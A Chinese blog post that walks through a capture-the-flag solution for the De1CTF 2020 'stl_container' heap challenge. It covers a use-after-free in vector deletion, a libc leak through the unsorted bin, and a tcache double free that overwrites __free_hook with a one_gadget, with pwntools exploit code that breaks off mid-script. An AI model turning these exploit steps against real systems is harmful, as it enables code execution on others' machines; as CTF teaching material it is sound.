@@ -1,0 +1,368 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="第一次正式做比赛题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="De1CTF2020之stl_container">
+<meta property="og:url" content="http://blingblingxuanxuan.github.io/2020/05/03/stl-container/index.html">
+<meta property="og:site_name" content="Clang鱼塘">
+<meta property="og:description" content="第一次正式做比赛题">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-05-02T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-02-17T06:33:13.296Z">
+<meta property="article:author" content="blingbling">
+<meta name="twitter:card" content="summary"><title>De1CTF2020之stl_container | Clang鱼塘</title><link ref="canonical" href="http://blingblingxuanxuan.github.io/2020/05/03/stl-container/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-feather-alt"></i></span><span class="header-nav-menu-item__text">文章</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/archives/"><span class="header-nav-submenu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-submenu-item__text">归档</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/categories/"><span class="header-nav-submenu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-submenu-item__text">分类</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/tags/"><span class="header-nav-submenu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-submenu-item__text">标签</span></a></div></div></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-fingerprint"></i></span><span class="header-nav-menu-item__text">关于</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/author/"><span class="header-nav-submenu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-submenu-item__text">作者</span></a></div></div></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-angle-double-down"></i></span><span class="header-nav-menu-item__text">其他</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/friends/"><span class="header-nav-submenu-item__icon"><i class="fas fa-thumbs-up"></i></span><span class="header-nav-submenu-item__text">友链</span></a></div></div></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Clang鱼塘</div><div class="header-banner-info__subtitle"></div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">De1CTF2020之stl_container</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2020-05-03</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-02-17</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body"><p><a href="stl_container">stl_container</a><br><a href="libc-2.27.so">libc-2.27.so</a></p>
+
+        <h1 id="1-触发异常分支"   >
+          <a href="#1-触发异常分支" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-触发异常分支" class="headerlink" title="1 触发异常分支"></a>1 触发异常分支</h1>
+      <p>这个题目寻找漏洞点的过程比较曲折，IDA打开发现是c++代码，但是我真的不懂C++，纠结从代码里找漏洞找了一天也没思路。在男票的提醒下，直接触发漏洞，再根据触发的漏洞去理解程序然后利用。</p>
+<p>main函数中可以看到四个stl函数。list和vector函数中实现了add,delete和show。queue和stack中只支持add和delete。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">    TestList();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">    TestVector();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">    TestQueue();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">    TestStack();</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></div></figure>
+<p>由于是堆相关的题目，很自然想到问题大多出在free时，因此对list和vector下的add和delete进行测试。在add两个vector，删除index为0的vector，然后执行show（0）时，打印了一堆无法显示的字符。</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">STL Container Test</span><br><span class="line">1. list</span><br><span class="line">2. vector</span><br><span class="line">3. queue</span><br><span class="line">4. stack</span><br><span class="line">5. exit</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt; 2</span></span><br><span class="line">1. add</span><br><span class="line">2. delete</span><br><span class="line">3. show</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt; 1</span></span><br><span class="line">input data:123</span><br><span class="line">done!</span><br><span class="line">STL Container Test</span><br><span class="line">……</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt; 2</span></span><br><span class="line">1. add</span><br><span class="line">2. delete</span><br><span class="line">3. show</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt; 1</span></span><br><span class="line">input data:qwe</span><br><span class="line">done!</span><br><span class="line">STL Container Test</span><br><span class="line">……</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt; 2</span></span><br><span class="line">1. add</span><br><span class="line">2. delete</span><br><span class="line">3. show</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt; 2</span></span><br><span class="line">index?</span><br><span class="line">0</span><br><span class="line">done!</span><br><span class="line">STL Container Test</span><br><span class="line">……</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt; 2</span></span><br><span class="line">1. add</span><br><span class="line">2. delete</span><br><span class="line">3. show</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt; 3</span></span><br><span class="line">index?</span><br><span class="line">0</span><br><span class="line">data: ���V</span><br></pre></td></tr></table></div></figure>
+<p>data部分应该是访问了非法内存，那么接下来就用gef进行调试，看看是什么原因导致了访问非法内存。</p>
+
+        <h1 id="2-分析异常原因"   >
+          <a href="#2-分析异常原因" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-分析异常原因" class="headerlink" title="2 分析异常原因"></a>2 分析异常原因</h1>
+      <p>申请两个vector，然后查看chunk的分布情况：</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">~~~~~~</span><br><span class="line">Chunk(addr=0x560ff5676490, size=0x20, flags=PREV_INUSE)</span><br><span class="line">    [0x0000560ff5676490     50 65 67 f5 0f 56 00 00 f0 65 67 f5 0f 56 00 00    Peg..V...eg..V..]</span><br><span class="line">~~~~~~</span><br><span class="line">Chunk(addr=0x560ff5676550, size=0xa0, flags=PREV_INUSE)</span><br><span class="line">    [0x0000560ff5676550     76 65 63 74 6f 72 31 31 31 0a 00 00 00 00 00 00    vector111.......]</span><br><span class="line">Chunk(addr=0x560ff56765f0, size=0xa0, flags=PREV_INUSE)</span><br><span class="line">    [0x0000560ff56765f0     76 65 63 74 6f 72 32 32 32 0a 00 00 00 00 00 00    vector222.......]</span><br><span class="line">Chunk(addr=0x560ff5676690, size=0xe980, flags=PREV_INUSE)  ←  top chunk</span><br><span class="line">-----------------------------------------------------------------------------------</span><br><span class="line">gef➤  x/10gx 0x560ff5676490</span><br><span class="line">0x560ff5676490:	0x0000560ff5676550	0x0000560ff56765f0</span><br><span class="line">0x560ff56764a0:	0x0000000000000000	0x00000000000000a1</span><br></pre></td></tr></table></div></figure>
+<p>可以看到0x560ff5676490处依次存放了vector(0) 和vector(1)的字符串地址。接下来删除vector(0)，看看这个地址处和字符串有什么变化，如下。</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">~~~~~~~~</span><br><span class="line">Chunk(addr=0x560ff5676490, size=0x20, flags=PREV_INUSE)</span><br><span class="line">    [0x0000560ff5676490     f0 65 67 f5 0f 56 00 00 f0 65 67 f5 0f 56 00 00    .eg..V...eg..V..]</span><br><span class="line">~~~~~~~~</span><br><span class="line">Chunk(addr=0x560ff5676550, size=0xa0, flags=PREV_INUSE)</span><br><span class="line">    [0x0000560ff5676550     76 65 63 74 6f 72 31 31 31 0a 00 00 00 00 00 00    vector111.......]</span><br><span class="line">Chunk(addr=0x560ff56765f0, size=0xa0, flags=PREV_INUSE)</span><br><span class="line">    [0x0000560ff56765f0     b0 64 67 f5 0f 56 00 00 32 0a 00 00 00 00 00 00    .dg..V..2.......]</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">gef➤  x/10gx 0x560ff5676490</span><br><span class="line">0x560ff5676490:	0x0000560ff56765f0	0x0000560ff56765f0</span><br><span class="line">0x560ff56764a0:	0x0000000000000000	0x00000000000000a1</span><br></pre></td></tr></table></div></figure>
+<p>可以看到0x560ff5676490处，原本放vector(0)字符串地址的位置被vector(1)字符串地址<code>0x0000560ff56765f0</code>覆盖了，而且vector(1)字符串地址处的空间被释放了，vector(0)的字符串<code>“vector111”</code>依然在堆中。</p>
+<p>执行show(0)时，返回如下信息：</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x4f bytes:</span><br><span class="line">    00000000  64 61 74 61  3a 20 b0 64  67 f5 0f 56  0a 53 54 4c  │data│: ·d│g··V│·STL│</span><br><span class="line">    00000010  20 43 6f 6e  74 61 69 6e  65 72 20 54  65 73 74 0a  │ Con│tain│er T│est·│</span><br><span class="line">    00000020  31 2e 20 6c  69 73 74 0a  32 2e 20 76  65 63 74 6f  │1. l│ist·│2. v│ecto│</span><br><span class="line">    00000030  72 0a 33 2e  20 71 75 65  75 65 0a 34  2e 20 73 74  │r·3.│ que│ue·4│. st│</span><br><span class="line">    00000040  61 63 6b 0a  35 2e 20 65  78 69 74 0a  3e 3e 20     │ack·│5. e│xit·│&gt;&gt; │</span><br><span class="line">    0000004f</span><br><span class="line">data: \xb0dg�V</span><br></pre></td></tr></table></div></figure>
+<p>根据接收到的data可以看出，打印的是<code>b0 64  67 f5 0f 56</code>，这个正好对上了此时地址0x560ff56765f0处的内容。</p>
+<ul>
+<li>分析到这里，可以看出我们在delete 0号vector时，实际发生了这么一个过程：0号vector的字符串地址被从0x560ff5676490空间中删除，并且将1号vector的字符串地址前移一位；然后再free 0号vector的字符串地址，但此时该处已经变成 1号vector的字符串地址；因此导致删除 0号vector却free了 1号vector的字符串地址。而1号vector的字符串地址后续还可以继续被使用，这就是一个悬空指针。</li>
+</ul>
+
+        <h1 id="3-悬空指针可以做什么"   >
+          <a href="#3-悬空指针可以做什么" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-悬空指针可以做什么" class="headerlink" title="3 悬空指针可以做什么"></a>3 悬空指针可以做什么</h1>
+      <p>这个悬空指针目前有两种操作：</p>
+<ul>
+<li>delete() - double free。由于这个题是ubuntu18.04下libc-2.27.so，有Tcache，因此一次double free就可以形成一个环，进而任意地址写。可以参考我之前做过的一个链接：<a href="https://blingblingxuanxuan.github.io/2020/03/13/TcacheTear/">https://blingblingxuanxuan.github.io/2020/03/13/TcacheTear/</a></li>
+<li>show() - 泄露信息。如libc、堆栈、程序等地址或信息。</li>
+</ul>
+
+        <h2 id="3-1-泄露libc"   >
+          <a href="#3-1-泄露libc" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-1-泄露libc" class="headerlink" title="3.1 泄露libc"></a>3.1 泄露libc</h2>
+      <p>通常的做法是将一个chunk free到unsorted bin中，再将这个chunk申请回来，然后打印该chunk内容，就可以计算出libc的地址。</p>
+<p>这道题中我们无法控制申请的堆空间的大小，但是每add一个list/vector/queue/stack时，在Test::Init中都有malloc(0x98)，这些chunk在相应的delete操作后都会串到大小为0xa0的Tcache链上。一条Tcache链最多串7个chunk，第8个相同大小的chunk会被放到unsorted bin中。</p>
+<p>构造如下顺序的add和delete。最先delete list(1)时，大小为0xa0的Tcache链上会存在一个之前的chunk，此时我们只需delete 6个就可以将vector(0)放到unsorted bin中（实际是将vector(1)的data块扔到了unsorted bin），接下来通过show(vector 0)就可以读取到leak的地址，从而得到malloc_state结构体地址，最后查找libc-2.27.so中malloc_trim()中malloc_state的偏移，就可以计算出libc地址。</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">vector_add(<span class="string">&quot;vector111&quot;</span>)</span><br><span class="line">vector_add(<span class="string">&quot;vector222&quot;</span>)</span><br><span class="line">list_add(<span class="string">&quot;list111&quot;</span>)</span><br><span class="line">list_add(<span class="string">&quot;list222&quot;</span>)</span><br><span class="line">queue_add(<span class="string">&quot;queue111&quot;</span>)</span><br><span class="line">queue_add(<span class="string">&quot;queue222&quot;</span>)</span><br><span class="line">stack_add(<span class="string">&quot;stack111&quot;</span>)</span><br><span class="line">stack_add(<span class="string">&quot;stack222&quot;</span>)</span><br><span class="line"></span><br><span class="line">list_delete(<span class="number">1</span>)</span><br><span class="line">list_delete(<span class="number">0</span>)</span><br><span class="line">queue_delete()</span><br><span class="line">queue_delete()</span><br><span class="line">stack_delete()</span><br><span class="line">stack_delete()</span><br><span class="line">vector_delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">vector_show(<span class="number">0</span>)</span><br><span class="line">leak_addr = u64(myproc.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">state_addr = leak_addr - <span class="number">0x60</span></span><br><span class="line">libc_addr = state_addr - <span class="number">0x3EBC40</span></span><br><span class="line">log.warn(<span class="string">&quot;libc_addr: 0x%x&quot;</span> % libc_addr)</span><br></pre></td></tr></table></div></figure>
+
+        <h2 id="3-2-写libc的函数指针"   >
+          <a href="#3-2-写libc的函数指针" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-2-写libc的函数指针" class="headerlink" title="3.2 写libc的函数指针"></a>3.2 写libc的函数指针</h2>
+      <p>由于本题got表不可写，且开启了PIE。因此考虑写libc中的函数指针，如<code>__malloc_hook</code>和<code>__free_hook</code>，将函数指针写成one gadget地址，下次调用到malloc或free时就能get shell。</p>
+<p>泄露完libc后，需要调整下堆空间的布局，通过double free获取一个环（在Tcache链上），从而去任意地址写。</p>
+<p>由于此时Tcache上0xa0链上是满的，因此需要add操作将Tcache链上的chunk用掉一些。我这里add了三次，其中一次必须是add vector(凑齐两个vector)，不然后续无法delete 两次形成double free。</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">one_gadget1 &#x3D; libc_addr + 0x4f322</span><br><span class="line">free_hook_addr &#x3D; libc_addr + 0x3ed8e8</span><br><span class="line"></span><br><span class="line">vector_add(&quot;vector333&quot;)</span><br><span class="line">list_add(&quot;list333&quot;)</span><br><span class="line">list_add(&quot;list444&quot;)</span><br><span class="line">vector_delete(0)</span><br><span class="line">vector_delete(0)</span><br><span class="line"></span><br><span class="line">vector_add(p64(free_hook_addr))</span><br><span class="line">vector_add(p64(one_gadget1))</span><br></pre></td></tr></table></div></figure>
+<p>在libc-2.27.so中找到三个可用gadget，其中0x4f322可利用成功：</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">bling@Ubuntu1804:/mnt/hgfs/vmshare-1804$ one_gadget libc-2.27.so </span><br><span class="line">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line"></span><br><span class="line">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></div></figure>
+
+        <h1 id="2-EXP"   >
+          <a href="#2-EXP" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-EXP" class="headerlink" title="2 EXP"></a>2 EXP</h1>
+      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">myelf = ELF(<span class="string">&quot;./stl_container&quot;</span>)</span><br><span class="line">mylibc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">myproc = process(myelf.path)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_add</span>(<span class="params">data</span>):</span></span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    myproc.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    myproc.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;input data:&quot;</span>)</span><br><span class="line">    myproc.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    myproc.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    myproc.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;index?&quot;</span>)</span><br><span class="line">    myproc.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_show</span>(<span class="params">index</span>):</span></span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    myproc.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    myproc.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;index?&quot;</span>)</span><br><span class="line">    myproc.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vector_add</span>(<span class="params">data</span>):</span></span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    myproc.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    myproc.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;input data:&quot;</span>)</span><br><span class="line">    myproc.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vector_delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    myproc.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    myproc.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;index?&quot;</span>)</span><br><span class="line">    myproc.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vector_show</span>(<span class="params">index</span>):</span></span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    myproc.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    myproc.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;index?&quot;</span>)</span><br><span class="line">    myproc.sendline(<span class="built_in">str</span>(index))</span><br><span 